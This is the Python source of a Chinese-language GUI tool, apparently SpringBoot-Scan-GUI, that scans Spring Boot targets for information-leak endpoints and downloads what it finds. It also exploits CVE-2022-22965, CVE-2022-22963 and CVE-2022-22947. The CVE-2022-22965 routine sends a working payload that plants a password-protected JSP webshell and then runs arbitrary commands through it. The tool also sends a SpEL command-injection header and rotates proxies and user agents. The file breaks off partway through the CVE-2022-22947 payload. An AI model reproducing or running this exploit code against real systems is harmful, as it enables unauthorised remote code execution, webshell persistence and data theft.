#!/usr/bin/env python
# coding=utf-8
import webbrowser, sys, json, re, os, random, shutil
import urllib3, requests
import tkinter as tk
from threading import Thread
from time import sleep, strftime, localtime
from tkinter import messagebox, filedialog, ttk
from tkinter.filedialog import askdirectory

class RootFrom:
    def __init__(self):
        global user_agent
        global cves
        banner =r'''
  ______                       __                      _______                        __     
 /      \                     |  \                    |       \                      |  \    
|  $$$$$$\  ______    ______   \$$ _______    ______  | $$$$$$$\  ______    ______  _| $$_   
| $$___\$$ /      \  /      \ |  \|       \  /      \ | $$__/ $$ /      \  /      \|   $$ \  
 \$$    \ |  $$$$$$\|  $$$$$$\| $$| $$$$$$$\|  $$$$$$\| $$    $$|  $$$$$$\|  $$$$$$\\$$$$$$  
 _\$$$$$$\| $$  | $$| $$   \$$| $$| $$  | $$| $$  | $$| $$$$$$$\| $$  | $$| $$  | $$ | $$ __ 
|  \__| $$| $$__/ $$| $$      | $$| $$  | $$| $$__| $$| $$__/ $$| $$__/ $$| $$__/ $$ | $$|  \
 \$$    $$| $$    $$| $$      | $$| $$  | $$ \$$    $$| $$    $$ \$$    $$ \$$    $$  \$$  $$
  \$$$$$$ | $$$$$$$  \$$       \$$ \$$   \$$ _\$$$$$$$ \$$$$$$$   \$$$$$$   \$$$$$$    \$$$$ 
          | $$                              |  \__| $$                                       
          | $$                               \$$    $$                                       
           \$$                                \$$$$$$                                        
            ______                                                                           
           /      \                                                                             
          |  $$$$$$\  _______  ______   _______       SpringBootScan-GUI Version: 1.0
          | $$___\$$ /       \|      \ |       \    +----------------------------------+ 
           \$$    \ |  $$$$$$$ \$$$$$$\| $$$$$$$\   + 图形化 by:  →13exp←            + 
           _\$$$$$$\| $$      /      $$| $$  | $$   + https://github.com/13exp/        + 
          |  \__| $$| $$_____|  $$$$$$$| $$  | $$   +----------------------------------+   
           \$$    $$ \$$     \\$$    $$| $$  | $$   + 命令行 by: →曾哥(@AabyssZG)←   + 
            \$$$$$$   \$$$$$$$ \$$$$$$$ \$$   \$$   + https://github.com/AabyssZG/     +
                                                    +----------------------------------+                                                                                                                                   
'''
        user_agent = (
      "Random",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00")
        cves = ("CVE-2022-22965","CVE-2022-22963","CVE-2022-22947")
        self.root = tk.Tk()
        self.root.title("SpringBoot-Scan-GUI")
        self.root.geometry("1024x439")
        self.root.resizable(0,0)
        # 泄露扫描
        tk.Label(self.root,text="泄露扫描").place(x=190,y=5)
        tk.Label(self.root,text="  URL").place(x=100,y=30)
        tk.Label(self.root,text="  URLs").place(x=100,y=60)
        tk.Label(self.root,text="User-Agent").place(x=70,y=90)
        tk.Label(self.root,text="扫描代理").place(x=90,y=120)
        tk.Label(self.root,text="自动代理").place(x=90,y=150)
        tk.Label(self.root,text="信息泄露字典").place(x=70,y=180)
        tk.Label(self.root,text="泄露下载").place(x=90,y=210)
        # 漏洞利用
        tk.Label(self.root,text="漏洞扫描利用").place(x=180,y=235)
        tk.Label(self.root,text="执行命令").place(x=85,y=260)
        tk.Label(self.root,text="CVEs").place(x=100,y=290)
        tk.Label(self.root,text="存在漏洞地址").place(x=60,y=320)
        tk.Label(self.root,text="多漏洞地址").place(x=60,y=350)
        # 泄露扫描控件
        self.url = tk.Entry(self.root)
        self.url.place(x=150,y=30)
        self.urls = tk.Entry(self.root,state='disable')
        self.urls.place(x=150,y=60)
        self.User_Agent = ttk.Combobox(self.root,width=18)
        self.User_Agent['value'] = user_agent
        self.User_Agent.current(0)
        self.User_Agent.place(x=150,y=90)
        self.proxy = tk.Entry(self.root)
        self.proxy.place(x=150,y=120)
        self.proxy_auto = tk.Entry(self.root,state='disable')
        self.proxy_auto.place(x=150,y=150)
        self.info_dict = tk.Entry(self.root,state='disable')
        self.info_dict.place(x=150,y=180)
        # 泄露下载
        self.download = tk.Entry(self.root,state='disable')
        self.download.place(x=150,y=210)
        # 漏洞利用控件
        self.reverse_tcp = tk.Entry(self.root)
        self.reverse_tcp.place(x=150,y=260)
        self.reverse_tcp.insert(0,"仅支持CVE-2022-22965")
        self.CVEs = ttk.Combobox(self.root,width=18)
        self.CVEs['value'] = cves
        self.CVEs.current(0)
        self.CVEs.place(x=150,y=290)
        self.rank =  tk.Entry(self.root)
        self.rank.place(x=150,y=320)
        self.ranks =  tk.Entry(self.root,state='disable')
        self.ranks.place(x=150,y=350)
        tk.Button(self.root,text="浏览",command=self.Openfiledir1).place(x=300,y=55)
        tk.Button(self.root,text="浏览",command=self.Openfiledir2).place(x=300,y=145)
        tk.Button(self.root,text="浏览",command=self.Openfiledir3).place(x=300,y=175)
        tk.Button(self.root,text="浏览",command=self.Openfiledir5).place(x=300,y=205)
        tk.Button(self.root,text="浏览",command=self.Openfiledir4).place(x=300,y=345)
        # 执行按钮
        tk.Button(self.root,text="泄露扫描",command=self.scan).place(x=70,y=390)
        tk.Button(self.root,text="漏扫利用",command=self.vule).place(x=140,y=390)
        tk.Button(self.root,text="泄露下载",command=self.dumpinfo).place(x=210,y=390)
        tk.Button(self.root,text="全部清除",command=self.clear).place(x=280,y=390)
        tk.Button(self.root,text="执行",command=self.CVE_2022_22965_Exec).place(x=300,y=255)
        # 反馈框
        self.vbar = ttk.Scrollbar(self.root)
        self.info_text = tk.Text(self.root,width=95,height=33,yscrollcommand=self.vbar.set)
        self.info_text.insert(tk.INSERT,banner)
        self.info_text.place(x=350,y=0)
        self.vbar.config(command=self.info_text.yview)
        self.vbar.pack(side=tk.RIGHT, fill="y")
        # 日志功能
        self.log_var = tk.StringVar(self.root)
        self.log = ttk.Checkbutton(self.root,text="日志功能",variable=self.log_var,onvalue="启用",offvalue="不启用")
        self.log.place(x=255,y=5)
        #菜单容器创建
        menu = tk.Menu(self.root)
        #创建菜单
        menu_kid = tk.Menu(menu,tearoff=0)
        menu.add_cascade(label='菜单',menu=menu_kid)
        menu_kid.add_command(label='Fofa语法',command=Fofa_from)
        menu_kid.add_command(label='软件信息',command=self.software_info)
        menu_kid.add_command(label='Shell信息',command=self.shell_info)
        menu_kid.add_separator()
        menu_kid.add_command(label='退出',command=self.Exit)
        menu_info = tk.Menu(menu,tearoff=0)
        menu.add_cascade(label='清除',menu=menu_info)
        dir_clear = tk.Menu(menu,tearoff=0)
        menu_info.add_cascade(label='路径清除',menu=dir_clear)
        dir_clear.add_command(label='URLs',command=self.clear_dir1)
        dir_clear.add_command(label='自动代理',command=self.clear_dir2)
        dir_clear.add_command(label='泄露字典',command=self.clear_dir3)
        dir_clear.add_command(label='泄露下载',command=self.clear_dir5)
        dir_clear.add_command(label='漏洞地址',command=self.clear_dir4)
        dir_clear.add_command(label='ALL清除',command=self.clear_dirs)
        menu_info.add_cascade(label='日志清除',command=self.clearlog)
        menu_info.add_cascade(label='全局清除',command=self.clear)
        menu_get = tk.Menu(menu,tearoff=0)
        menu.add_cascade(label='更多',menu=menu_get)
        menu_get.add_command(label='利用姿势',command=self.vule_info)
        self.root.config(menu=menu)
        self.root.mainloop()
    def Exit(self):
        Exit = messagebox.askokcancel('退出','确定退出吗?')
        if Exit == True:
            self.root.destroy()
    def shell_info(self):
        messagebox.showinfo("Shell信息","tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
    def vule_info(self):
        webbrowser.open('https://blog.zgsec.cn/index.php/archives/129/')
    def software_info(self):
        messagebox.showinfo("软件信息","modify by 13exp")
    def Openfiledir1(self):
        filetypes=[('txt','*.txt'),('all','*.*')]
        path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
        self.urls.config(state='normal')
        if path == '':
            self.urls.config(state='disable')
        else:
            self.urls.delete(0,'end')
            path = path.replace('/','\\')
            self.urls.insert('insert',path)
            self.urls.config(state='disable')
    def Openfiledir2(self):
        # ('xlsx','*.xlsx')
        filetypes=[('txt','*.txt'),('all','*.*')]
        path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
        self.proxy_auto.config(state='normal')
        if path == '':
            self.proxy_auto.config(state='disable')
        else:
            self.proxy_auto.delete(0,'end')
            path = path.replace('/','\\')
            self.proxy_auto.insert('insert',path)
            self.proxy_auto.config(state='disable')
    def Openfiledir3(self):
        filetypes=[('txt','*.txt'),('all','*.*')]
        path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
        self.info_dict.config(state='normal')
        if path == '':
            self.info_dict.config(state='disable')
        else:
            self.info_dict.delete(0,'end')
            path = path.replace('/','\\')
            self.info_dict.insert('insert',path)
            self.info_dict.config(state='disable')
    def Openfiledir4(self):
        filetypes=[('txt','*.txt'),('xlsx','*.xlsx'),('all','*.*')]
        path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
        self.ranks.config(state='normal')
        if path == '':
            self.ranks.config(state='disable')
        else:
            self.ranks.delete(0,'end')
            path = path.replace('/','\\')
            self.ranks.insert('insert',path)
            self.ranks.config(state='disable')
    def Openfiledir5(self):
        filetypes=[('urlout.txt','urlout.txt'),('.txt','*.txt'),('xlsx','*.xlsx'),('all','*.*')]
        path = filedialog.askopenfilename(title='文件选择',filetypes=filetypes)
        self.download.config(state='normal')
        if path == '':
            self.download.config(state='disable')
        else:
            self.download.delete(0,'end')
            path = path.replace('/','\\')
            self.download.insert('insert',path)
            self.download.config(state='disable')
    def clear(self):
        self.url.delete(0,'end')
        self.urls.config(state='normal')
        self.urls.delete(0,'end')
        self.urls.config(state='disable')
        self.proxy.delete(0,'end')
        self.proxy_auto.config(state='normal')
        self.proxy_auto.delete(0,'end')
        self.proxy_auto.config(state='disable')
        self.info_dict.config(state='normal')
        self.info_dict.delete(0,'end')
        self.info_dict.config(state='disable')
        self.reverse_tcp.delete(0,'end')
        self.rank.delete(0,'end')
        self.ranks.config(state='normal')
        self.ranks.delete(0,'end')
        self.ranks.config(state='disable')
        self.info_text.delete('1.0','end')
    def clear_dir1(self):
        self.urls.config(state='normal')
        self.urls.delete(0,'end')
        self.urls.config(state='disable')
    def clear_dir2(self):
        self.proxy_auto.config(state='normal')
        self.proxy_auto.delete(0,'end')
        self.proxy_auto.config(state='disable')
    def clear_dir3(self):
        self.info_dict.config(state='normal')
        self.info_dict.delete(0,'end')
        self.info_dict.config(state='disable')
    def clear_dir4(self):
        self.ranks.config(state='normal')
        self.ranks.delete(0,'end')
        self.ranks.config(state='disable')
    def clear_dir5(self):
        self.download.config(state='normal')
        self.download.delete(0,'end')
        self.download.config(state='disable')
    def clear_dirs(self):
        self.urls.config(state='normal')
        self.urls.delete(0,'end')
        self.urls.config(state='disable')
        self.proxy_auto.config(state='normal')
        self.proxy_auto.delete(0,'end')
        self.proxy_auto.config(state='disable')
        self.info_dict.config(state='normal')
        self.info_dict.delete(0,'end')
        self.info_dict.config(state='disable')
        self.ranks.config(state='normal')
        self.ranks.delete(0,'end')
        self.ranks.config(state='disable')
        self.download.config(state='normal')
        self.download.delete(0,'end')
        self.download.config(state='disable')
    def clearlog(self):
        if os.path.exists("scanLogs.log"):
            os.remove("scanLogs.log")
        if os.path.exists("downloadLogs.log"):
            os.remove("downloadLogs.log")
        if os.path.exists("vuleLogs.log"):
            os.remove("vuleLogs.log")
        if os.path.exists("vuleExecLogs.log"):
            os.remove("vuleExecLogs.log")
    def uas(self):
        if self.User_Agent.get() == "Random":
            ua_nums = len(user_agent) - 1
            rands = random.randint(1,ua_nums) 
            ua = user_agent[rands]
        else:
            ua = self.User_Agent.get()
        return ua
    def rank_check(self):
        if self.rank.get() == "" and self.ranks.get() == "":
            rank = ""
        elif self.rank.get() != "" and self.ranks.get() != "":
            rank = ""
        elif self.rank.get() != "" and self.ranks.get() == "":
            rank = self.rank.get()
        else:
            # 文件
            rank = self.ranks.get()
        return rank
    def url_check(self):
        if self.url.get() == "" and self.urls.get() == "":
            url = ""
        elif self.url.get() != "" and self.urls.get() != "":
            url = ""
        elif self.url.get() != "" and self.urls.get() == "":
            url = self.url.get()
        else:
            # 文件
            url = self.urls.get()
        return url
    def proxy_check(self):
        proxy = ""
        if self.proxy.get() != "" and self.proxy_auto.get() != "":
            proxy = ""
        elif self.proxy.get() != "" and self.proxy_auto.get() == "":
            proxy = self.proxy.get()
        elif self.proxy.get() == "" and self.proxy_auto.get() != "":
            proxy = self.proxy_auto.get()
        return proxy
    def url_proxy_get(self,url):
        urls = []
        if os.path.isfile(url) != True:
            url = url
        else:
            with open(url,"r") as f:
                url_file = f.read().split("\n")
            for i in url_file:
                if i != "":
                    urls.append(i)
            url = urls
        proxy = self.proxy_check()
        proxies = []
        testurl = "https://www.baidu.com/"
        headers = {"User-Agent": "Mozilla/5.0"}
        if os.path.isfile(proxy) != True:
            proxies = proxy
            proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': proxies},
                    "https": "http://%(proxy)s/" % {'proxy': proxies}
                    }
            try:
                requests.packages.urllib3.disable_warnings()
                res = requests.get(testurl, timeout=10, proxies=proxies, verify=False, headers=headers)
                if res.status_code == 200:
                    proxies = proxies
                    info = "代理正常 {} ".format(proxies)
                    self.info_text.insert(tk.INSERT,info)
                    self.info_text.insert(tk.INSERT, '\n')
            except:
                info = "代理不可用 {} ".format(proxies)
                self.info_text.insert(tk.INSERT,info)
                self.info_text.insert(tk.INSERT, '\n')
        else:
            with open(proxy,"r") as f:
                proxy_file = f.read().split("\n")
                for i in proxy_file:
                    if i != "":
                        proxies.append(i)           
            for i in proxies:
                proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': i},
                    "https": "http://%(proxy)s/" % {'proxy': i}
                    }
                try:
                    requests.packages.urllib3.disable_warnings()
                    res = requests.get(testurl, timeout=10, proxies=proxies, verify=False, headers=headers)
                    if res.status_code == 200:
                        proxies = proxies
                        info = "代理正常 {} ".format(proxies)
                        self.info_text.insert(tk.INSERT,info)
                        self.info_text.insert(tk.INSERT, '\n')
                        break
                    else:
                        continue
                except:
                    info = "代理不可用 {} ".format(proxies)
                    self.info_text.insert(tk.INSERT,info)
                    self.info_text.insert(tk.INSERT, '\n')
        return url,info,proxies
    def info_check(self, urllist, proxies, ua):
        if not os.path.exists("urlout.txt"):
            f = open("urlout.txt", "a")
            f.close()
        title = "================开始对目标URL测试SpringBoot信息泄露端点================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        dir_file = self.info_dict.get()
        if dir_file != "":
            with open(dir_file, 'r') as web:
                webs = web.readlines()
                for web in webs:
                    web = web.strip()
                    if ('://' not in urllist):
                        urllist = str("http://") + str(urllist)
                    if str(urllist[-1]) != "/":
                        u = urllist + "/" + web
                    else:
                        u = urllist + web
                    try:
                        header = {"User-Agent": ua}
                        requests.packages.urllib3.disable_warnings()
                        if proxies != "":
                            r = requests.get(url=u, headers=header, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
                        else:
                            r = requests.get(url=u, headers=header, timeout=6, verify=False)  # 设置超时6秒
                        if r.status_code == 503:
                            pass
                        elif r.status_code == 200:
                            back = "[+] 状态码%d" % r.status_code + ' ' + "信息泄露URL为:" + u + '    ' + "页面长度为:" + str(len(r.content))
                            self.info_text.insert(tk.INSERT,back)
                            self.info_text.insert(tk.INSERT, '\n')
                            f = open("urlout.txt", "a")
                            f.write(u + '\n')
                            f.close()
                        else:
                            back = "[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u
                            self.info_text.insert(tk.INSERT,back)
                            self.info_text.insert(tk.INSERT, '\n')
                    except:
                        back = "[-] URL为 " + u + " 的目标积极拒绝请求，予以跳过！"
                        self.info_text.insert(tk.INSERT,back)
                        self.info_text.insert(tk.INSERT, '\n')
                        break
                    if self.log_var.get() == "启用":
                        with open("scanLogs.log","a") as f:
                            f.write(back + ' ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                            f.write("\n")
            count = len(open("urlout.txt", 'r').readlines())
            if count >= 1:
                back = "[+][+][→] 发现目标URL存在SpringBoot敏感信息泄露，已经导出至 urlout.txt ，共%d行记录" % count
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            #time = strftime("%Y-%m-%d %H:%M:%S",localtime())
            if self.log_var.get() == "启用":
                with open("scanLogs.log","a") as f:
                    f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                    f.write("\n")
        else:
            messagebox.showinfo("提示","字典路径不能为空！")
    def Downloads(self,url,name,proxies):
        if not os.path.exists("dump"):
            file_dir = os.mkdir("dump")
        pwd = os.getcwd()
        dumpdir = os.path.join(pwd,"dump")
        requests.packages.urllib3.disable_warnings()
        try:
            back = "[+]执行下载中"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
            if proxies != "":
                r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
            else:
                r = requests.get(url, timeout=6, verify=False)  # 设置超时6秒
            if r.status_code == 200:
                with open('{}'.format(name),'wb') as f:
                    f.write(r.content)
                filedir = os.path.join(pwd,name)
                dstfile = os.path.join(dumpdir,name)
                if os.path.exists(dstfile):
                    os.remove(dstfile)
                shutil.move(filedir,dumpdir)
                if os.path.exists(name):
                    os.remove(name)
                back = "[+]下载完成 {}".format(name)
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                pass
        except:
            back = "[-] URL为 " + url + " 连接失败！"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("downloadLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def DumpInfo(self):
        input_urlfile = self.download.get()
        url_proxy = self.url_proxy_get("www.baidu.com")
        proxies = url_proxy[-1]
        info = url_proxy[1]
        if '不可用' in info:
            proxies = ""
        if input_urlfile == "":
            messagebox.showinfo("提示","下载文件不能为空！")
        else:
            urls = []
            with open('{}'.format(input_urlfile),'r') as f:
                url = f.read().split("\n")
            for i in url:
                if i != "":
                    urls.append(i)
            for i in urls:
                name = i.split('/')[2:]
                name = "-".join(name)
                if ":" in name:
                    name.replace(':',"-")
                if "：" in name:
                    name.replace('：',"-")
                self.Downloads(i,name,proxies)
                if os.path.exists(name):
                    os.remove(name)
        back = "[+]ALL下载完成"
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("downloadLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def dumpinfo(self):
        try:
            threadDumpInfo = Thread(target=self.DumpInfo)
            threadDumpInfo.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
    def Scan(self):
        input_url = self.url_check()
        url_proxy = self.url_proxy_get(input_url)
        url = url_proxy[0]
        proxies = url_proxy[-1]
        ua = self.uas()
        dict_dir = self.info_dict.get()
        info = url_proxy[1]
        if '不可用' in info:
            proxies = ""
        if url == "":
            messagebox.showinfo("提示","扫描泄露地址不能为空(且只能选一种模式)！")
        elif isinstance(url,list) == True:
            for i in url:
                i = i.strip("\n")
                self.info_check(i, proxies, ua)
        else:
            url = url.strip("\n")
            self.info_check(url, proxies, ua)
        back = "[+]泄露扫描完成"
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("scanLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def scan(self):
        try:
            threadScan = Thread(target=self.Scan)
            threadScan.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
    def CVE_2022_22965(self, url, proxies):
        title = "================开始对目标URL进行CVE-2022-22965漏洞利用================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        ua = self.uas()
        tar = '[+]target ' + url
        self.info_text.insert(tk.INSERT,tar)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("vuleLogs.log","a") as f:
                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        Headers_1 = {
            "User-Agent": ua,
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        data1 = payload_linux
        data2 = payload_win
        getpayload = url + payload_http
        try:
            requests.packages.urllib3.disable_warnings()
            if proxies != "":
                requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                sleep(1)
                requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                sleep(1)
                requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                sleep(1)
            else:
                requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False)
                sleep(1)
                requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False)
                sleep(1)
                requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False)
                sleep(1)
            test = requests.get(url + "tomcatwar.jsp")
            if (test.status_code == 200) and ('aabysszg' in str(test.text)):
                back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except Exception as e:
            back = str(e)
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def CVE_2022_22965_Exec(self):
        url = self.rank.get()
        if url != "":
            title = "================CVE_2022_2296命令执行================"
            self.info_text.insert(tk.INSERT,title)
            self.info_text.insert(tk.INSERT, '\n')
            tar = '[+]target ' + url
            self.info_text.insert(tk.INSERT,tar)
            self.info_text.insert(tk.INSERT, '\n')
            if self.log_var.get() == "启用":
                with open("vuleExecLogs.log","a") as f:
                    f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()) + " start")
                    f.write("\n")
            if url[-1] != '/':
                url += '/'
            cmd = self.reverse_tcp.get()
            url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
            try:
                r = requests.get(url_shell)
                resp = r.text
                result = re.findall('([^\x00]+)\n', resp)#[0]
            except urllib3.util.ssl_match_hostname.CertificateError:
                result = "[-] CVE_2022_2296命令执行 请求错误"
            except urllib3.exceptions.MaxRetryError:
                result = "[-] CVE_2022_2296命令执行 请求错误"
            except requests.exceptions.SSLError:
                result = "[-] CVE_2022_2296命令执行 请求错误"
            except:
                result = "[-] CVE_2022_2296命令执行 未知错误"
            self.info_text.insert(tk.INSERT,str(result))
            self.info_text.insert(tk.INSERT, '\n')
            if self.log_var.get() == "启用":
                with open("vuleExecLogs.log","a") as f:
                    f.write(str(result) + '   ' + str(strftime("%Y-%m-%d %H:%M:%S",localtime())) + " end")
                    f.write("\n")
        else:
            messagebox.showinfo("提示","存在漏洞地址不能为空！")
    def CVE_2022_22963(self, url, proxies):
        title = "================开始对目标URL进行CVE-2022-22963漏洞利用================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
        ua = self.uas()
        data = 'test'
        header = {
            'spring.cloud.function.routing-expression': payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = 'functionRouter'
        url = url + path
        requests.packages.urllib3.disable_warnings()
        try:
            if proxies != "":
                req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
            else:
                req = requests.post(url=url, headers=header, data=data, verify=False, timeout=6)
            code = req.status_code
            text = req.text
        
            rsp = '"error":"Internal Server Error"'

            if code == 500 and rsp in text:
                back = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell'
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22963漏洞不存在"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ConnectionError:
            back = "[-] CVE-2022-22963 无法连接,你的主机中的软件中止了一个已建立的连接"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ReadTimeout:
            back = "[-] CVE-2022-22963 请求超时,你的主机中的软件中止了一个已建立的连接"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.TooManyRedirects:
            back = "[-] CVE-2022-22963 过多的重定向,你的主机中的软件中止了一个已建立的连接"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "启用":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def CVE_2022_22947(self, url, proxies):
        title = "================开始对目标URL进行CVE-2022-22947漏洞利用================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        ua = self.uas()
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': ua,
            'Content-Type': 'application/json'
        }

        headers2 = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        payload = '''{\r
                  "id": "hacktest",\r
                  "filters": [{\r
                    "name": "AddResponseHeader",\r
